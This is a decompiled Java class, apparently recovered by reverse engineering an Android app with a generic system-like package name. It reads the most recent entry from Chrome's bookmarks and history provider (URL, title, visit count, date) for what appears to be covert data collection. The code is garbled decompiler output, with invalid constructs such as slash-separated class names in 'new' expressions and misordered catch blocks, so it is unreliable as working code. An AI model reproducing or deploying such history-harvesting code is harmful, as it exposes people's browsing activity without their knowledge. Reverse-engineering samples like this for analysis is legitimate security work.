package com.app.system.common.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.app.system.common.entity.URLHistory;
import java.util.Date;

public class c
  extends a
{
  String b = "content://com.android.chrome.browser/bookmarks";
  
  public c(Context paramContext)
  {
    super(paramContext);
  }
  
  public URLHistory a()
  {
    Object localObject3;
    try
    {
      Object localObject1 = this.a.getContentResolver().query(Uri.parse(this.b), com.app.system.common.a.b, null, null, null);
      try
      {
        URLHistory localURLHistory;
        if (((Cursor)localObject1).moveToLast())
        {
          String str = ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("title"));
          localURLHistory = new com/app/system/common/entity/URLHistory;
          localObject3 = ((Cursor)localObject1).getString(((Cursor)localObject1).getColumnIndex("url"));
          long l = ((Cursor)localObject1).getLong(((Cursor)localObject1).getColumnIndex("visits"));
          Date localDate = new java/util/Date;
          localDate.<init>(((Cursor)localObject1).getLong(((Cursor)localObject1).getColumnIndex("date")));
          localURLHistory.<init>(0L, (String)localObject3, str, l, localDate.getTime() / 1000L);
        }
        else
        {
          localURLHistory = null;
        }
        if ((localObject1 != null) && (!((Cursor)localObject1).isClosed()))
        {
          ((Cursor)localObject1).close();
          return localURLHistory;
        }
        return localURLHistory;
      }
      catch (Throwable localThrowable2) {}catch (Exception localException2)
      {
        localObject3 = localObject1;
        localObject1 = localException2;
      }
      Object localObject2;
      com.security.d.a.a("FileChrome", localException1.getMessage(), new Object[0]);
    }
    catch (Throwable localThrowable1)
    {
      localObject2 = null;
      if ((localObject2 != null) && (!((Cursor)localObject2).isClosed())) {
        ((Cursor)localObject2).close();
      }
      return null;
    }
    catch (Exception localException1)
    {
      localObject3 = null;
    }
    if ((localObject3 != null) && (!((Cursor)localObject3).isClosed()))
    {
      ((Cursor)localObject3).close();
      return null;
    }
    return null;
  }
}


/* Location:              ~/com/app/system/common/a/c.class
 *
 * Reversed by:           J
 */